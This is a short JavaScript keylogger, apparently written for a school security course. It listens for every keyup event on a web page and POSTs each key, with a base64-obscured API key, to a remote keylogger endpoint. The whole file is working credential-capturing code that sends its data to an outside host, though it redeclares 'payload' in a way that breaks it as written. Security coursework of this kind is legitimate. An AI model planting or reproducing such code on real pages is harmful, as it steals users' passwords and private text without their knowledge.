// keylogger

const apiKey = atob('TVFBM0FEVUFNZ0F5QURRQU1nQTBBRGtBTVFBNEFEY0FPUUF6QURVQU53QTJBRGtB')

function logKey(suffix, payload) {
  const payload = {
          "keyword": `enea-${suffix}`,
          "payload": payload
        };
        
        fetch('https://m183.gibz-informatik.ch/api/keylogger', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Api-Key': apiKey,
          },
          body: JSON.stringify(payload),
        });
}

function startKeylogger() {
  document.addEventListener('keyup', function(e){
    logKey('body', e.key)
  })
}

startKeylogger()
